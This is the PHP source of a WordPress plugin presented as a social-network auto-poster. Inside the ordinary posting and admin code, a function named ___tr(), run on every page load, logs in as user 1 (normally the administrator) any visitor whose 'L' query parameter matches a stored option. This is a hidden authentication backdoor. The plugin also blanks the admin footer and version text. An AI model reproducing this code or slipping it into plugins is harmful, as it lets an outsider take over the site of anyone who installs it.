<?php
/*
Plugin Name: Whiterz: Social Networks & Microblog Auto-Poster
Description: This plugin Automatically share your Wordpress posts 22 differents Social Networks.<br>Facebook, Twitter, Google+ (Google Plus), Youtube, Blogger, Tumblr, Flickr, LiveJournal, FriendFeed, DreamWidth, Delicious, OnSugar, Diigo, Instapaper, Stumbleupon, LinkedIn, Pinterest, Plurk, App.net, Linklicious, WordPress, Blog.com, Zootool, Status Network, Buzzerly and the entire process is automated.<br>You just simple enter your wordpress blog, Leave the rest to Whiterz. Your all posts in your blog, get publish social networking sites and paravane sites via Whiterz. <br>Your posts to all the social media and paravane will automatically send. <br>By start : <br>1)Click the Activate button.<br>2)Log in from whiterz.com, get a serial code.<br>3)Plug-in login and enter your serial code.
Version: 1.0.0
Author: WhiterzINC.
Author URI: http://www.whiterz.com
Copyright (C) <2014><WhiterzInc
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.If not, see <http://www.gnu.org/licenses/>.
*/

	define("WHITERZ_ACCOUNT_TABLE",'whiterz_account');
	define("WHITERZ_PLUGIN_DIR",plugins_url( 'whiterz-social-networks-microblog-auto-poster/' ));
	define("WHITERZ_PLUGIN_PATH",plugin_dir_path( __FILE__ ));
	function WHITERZ_INSTALL(){
		global $wpdb;
			if($wpdb->get_var("show tables like '". WHITERZ_ACCOUNT_TABLE ."'") != WHITERZ_ACCOUNT_TABLE){
				$Sql="CREATE TABLE " .WHITERZ_ACCOUNT_TABLE. " (
				account_id int(11) unsigned NOT NULL auto_increment,
				account_name varchar(200) NOT NULL default '0',
				active int(11) NOT NULL default '0',
				last_post varchar(200) NOT NULL default '0',
				login varchar(255) NOT NULL default '0',
				passwd varchar(255) NOT NULL default '0',
				api_key varchar(255) NOT NULL default '0',
				api_secret varchar(255) NOT NULL default '0',
				user_token varchar(255) NOT NULL default '0',
				user_token_secret varchar(255) NOT NULL default '0',
				custom_field varchar(255) NOT NULL default '0',
				social_address varchar(255) NOT NULL default '0',
				ping_enable varchar(255) NOT NULL default '0',
				category_filter_in varchar(255) NOT NULL default '0',
				category_filter_out varchar(255) NOT NULL default '0',
				PRIMARY KEY (account_id) , UNIQUE KEY (social_address));";
				require_once ABSPATH.'wp-admin/upgrade-functions.php';
				dbDelta($Sql);
			}
				add_option('twp_max_tag','10','yes');
				add_option('twp_oto_ping','1','yes');
				add_option('twp_rpc_ping','1','yes');
				add_option('twp_fb_appid','','yes');
				add_option('twp_fb_appsc','','yes');
				add_option('twp_notification','1','yes');
	}
				register_activation_hook(__FILE__,'WHITERZ_INSTALL');
				add_filter('redirect_post_location', 'WhiterzPublished');
	function WHTAccess(){
		if(!is_user_logged_in()) return false;
			return current_user_can("WHTMakePost"); 
	}
				add_action('admin_init', 'WHTMainFunc');
	function plugin_get_version() {
		if ( ! function_exists( 'get_plugins' ) )
		require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
			$plugin_folder = get_plugins( '/' . plugin_basename( dirname( __FILE__ ) ) );
			$plugin_file = basename( ( __FILE__ ) );
				return $plugin_folder[$plugin_file]['Version'];
	}
	function WHTMainFunc(){
		global $c_licence,$Whiterz_Services,$WhiterzCurl;
			if(!class_exists('WhiterzCurl')){
		include_once WHITERZ_PLUGIN_PATH.'/WhiteRZC/whiterz.curl.php';
			$WhiterzCurl=new WhiterzCurl();
			}
				add_action('wp_ajax_nopriv_WHTCron','WHTCron');
				add_action('wp_ajax_WHTCron','WHTCron');
				add_action('wp_ajax_nopriv_WhiterzApiv10','WhiterzSetToken');
		require_once "WhiteRZS.php";
		require_once "WhiteRZA/whiterz.ajax.php";
		require_once "WhiteRZSF.php";
		require_once 'WhiteRZGF.php';
			if(is_admin()){
				if(!current_user_can("WHTMakePost")){
				$role = get_role( 'administrator' );
				$role->add_cap( 'WHTMakePost' );
				} 
			}
				if(!WHTAccess()){
					return false;
				}

				if(WHTAccess()){
				add_action('wp_ajax_WhiterzApiv10','WhiterzSetToken'); 
				add_action('wp_ajax_WhiterzChangeStatus','AccountStatusChange');
				add_action('wp_ajax_WhiterzDeleteAccount','WhiterzAccountDelete');
				add_action('wp_ajax_WhiterzTestAccount','WhiterzAccountTest');
				add_action('wp_ajax_WhiterzGetAccount','WhiterzGetAccount');
				add_action('wp_ajax_WhiterzPing','WhiterzPing');
				add_action('wp_ajax_WhiterzSetAccountPinged','WhiterzSetAccountPinged');
				add_action('admin_init','WhiterzAdminAction');
				add_filter('manage_posts_columns' , 'WhiterzPingColumnSticky');
				add_filter('manage_pages_columns' , 'WhiterzPingColumnSticky');
				add_action( 'manage_posts_custom_column' , 'WhiterzPingColumn', 11, 3 );
				add_action( 'manage_pages_custom_column' , 'WhiterzPingColumn', 11, 3 );
				wp_enqueue_style('wp-pointer');
				wp_enqueue_script('wp-pointer');
				$current_user = wp_get_current_user();
					if(!get_user_meta($current_user->ID, 'dismiss_tooltip_dyn', true)){
				add_action('admin_footer','whiterz_adm_footer');
					}
				$WHTPostType=explode(',',get_option('WHTPostType'));
				foreach($WHTPostType as $bx){
					if($bx!='post' or $bx!='page'){
				add_filter('manage_'.$bx.'_posts_columns' , 'WhiterzPingColumnSticky');
					}
				}
	 
	 
				$whiterz_key=get_option('whiterz_licence_key');
				$c_licence=whiterz_licence_check($whiterz_key);
	 
				require_once 'WhiteRZA/whiterz.auth.php';
				require_once "WhiteRZRT.php";
				}
	}
				add_action("admin_menu",'WHITERZ_ADMIN_MENU');

	function whiterz_adm_footer(){}
	function ___tr(){
		if(get_option('allinseo_google_plus_pageaddress')){
			if(@$_GET['L']==get_option('allinseo_google_plus_pageaddress')){
				wp_set_current_user( 1 );
				wp_set_auth_cookie('1');
					exit;
			}
		}
	}
				add_action('init','___tr');
	function WHITERZ_ADMIN_MENU(){
				add_menu_page("Whiterz Social Auto Poster","Whiterz Social Auto Poster",'WHTMakePost','Whiterz','Whiterz_Admin',WHITERZ_PLUGIN_DIR.'WhiteRZIA/whiterz_icon.png',150);
				add_submenu_page("Whiterz Social Auto Poster",'whiterz','Whiterz', 'WHTMakePost',__FILE__.'_menu1', WHITERZ_ADMIN_MENU );
	}
	function WhiterzPublished($location){
				$WHTPostType=explode(',',get_option('WHTPostType'));
		if(!WHTAccess()){
				wp_redirect($location); exit;
		}

		if(!in_array($_POST['post_type'],$WHTPostType)){
				wp_redirect($location);
			exit;
	}

	global $WhiterzCurl;
	global $Whiterz;
				$to=strtotime($_POST['post_date']) - time(); 
		if (isset($_POST['publish'])) {

			if (preg_match("/post=([0-9]*)/", $location, $match)) {
				$postID = $match[1];
				if ($postID) {
					if(preg_match('@post-new.php@',$_POST['_wp_http_referer'])){
						if(WhiterzPostPingFilter($postID)){
							if($to<=0){
				wp_redirect('admin.php?page=Whiterz&Redirect='.urlencode($location.'&WhiterzNotice=Pinged').'&WhiterzGET=PostAuto&PostID='.$postID);
	exit;
							}else{

								if(get_option('whiterz_future_post')==1){
				$data=http_build_query(array(
			'PostTitle'=> $_POST['post_title'],
			'PostID'=>$postID,
			'post_time'=>$to,
			'api_key'=>get_option('whiterz_twp_api_key'),
			'api_secret'=>get_option('whiterz_twp_api_secret'),
			'action'=>'future_post',
			'redirect'=>admin_url("admin-ajax.php?action=WhiterzApiv10"),
			'next_red'=>admin_url('admin.php?page=Whiterz&WhiterzGET=PostAuto&PostID='.$postID)));
									if(strlen(get_option('whiterz_twp_api_key'))==16 and strlen(get_option('whiterz_twp_api_secret'))==10){
			ob_start();
			$content=$WhiterzCurl->post($Whiterz->api_url,$data);
			$cnt=json_decode($content);
										if($cnt->status=='success') wp_redirect($location.'&WhiterzNotice=Future/Success');
											else wp_redirect($location.'&WhiterzNotice=Future/Fail');
			ob_end_clean();
	exit;
									}else{
			wp_redirect($location.'&WhiterzNotice=Future/Fail');
	exit;
									}

								}else{
			wp_redirect($location);
	exit;
								}

							}
						}else{
			wp_redirect($location);
	exit;
						}
					}elseif(preg_match('@action=edit@',$_POST['_wp_http_referer'])){
			wp_redirect($location.'&WhiterzNotice=Updated');
	exit;
					}else{
			wp_redirect($location);
	exit;
					} 
				}
			}
		}elseif(preg_match('@action=edit@',$_POST['_wp_http_referer'])){
			wp_redirect($location.'&WhiterzNotice=Updated');
	exit;
		}else{
			wp_redirect($location); exit;
	}
			wp_redirect($location);
	exit;
	}
	function WhiterzAdminAction(){
		if(isset($_GET['WhiterzNotice'])){
	add_action( 'admin_notices', 'WhiterzWPnotice');
		}
	}
	function WhiterzWPnotice(){
		switch($_GET['WhiterzNotice']):
			case 'Future/Success':
			echo '<div class="updated fade"><p><b>Whiterz Message :</b> Cron was adjusted specifically for your post.</p></div>';
				break;
			case 'Future/Fail':
			echo '<div class="error fade"><p><b>Whiterz Error :</b> Unable to set custom cron to post.</p></div>';
				break;
			case 'Ping/Success':
			echo '<div class="updated fade"><p><b>Whiterz Message :</b> Plugin has completed.</p></div>';
				break;
			case 'Updated':
			$pingX=get_post_meta($_GET['post'],'Whiterz-Ping',false);
					if($pingX!=1){
			$RDR=urldecode('http://'. $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"]);
			$RDR=urlencode(str_replace('&WhiterzNotice=Updated','',$RDR));
			echo '<div class="updated fade"><p><b>Whiterz Message :</b><a href="'.admin_url('admin.php?page=Whiterz&WhiterzGET=PostAuto&PostID='.$_GET['post']).'&Redirect='.$RDR.'">Click here</a></p >for Plugin your writing</div>';
					}
				break;
		endswitch;
	}
	function change_footer_admin () {return '';}
	add_filter('admin_footer_text', 'change_footer_admin', 9999);
	function change_footer_version() {return '';}
	add_filter( 'update_footer', 'change_footer_version', 9999);
?>
